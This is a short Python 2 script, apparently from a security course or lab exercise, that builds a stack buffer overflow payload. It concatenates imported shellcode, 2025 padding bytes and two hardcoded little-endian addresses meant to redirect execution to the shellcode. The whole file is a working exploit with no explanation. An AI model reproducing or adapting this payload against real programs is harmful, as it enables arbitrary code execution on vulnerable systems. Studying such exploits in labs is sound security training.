from struct import pack 
from shellcode import shellcode 
shell_code_addr = 0xbffe91e8
ret_addr = 0xbffe99fc
print shellcode + "\x11"*2025 + pack("<I",shell_code_addr) + pack("<I", ret_addr)  
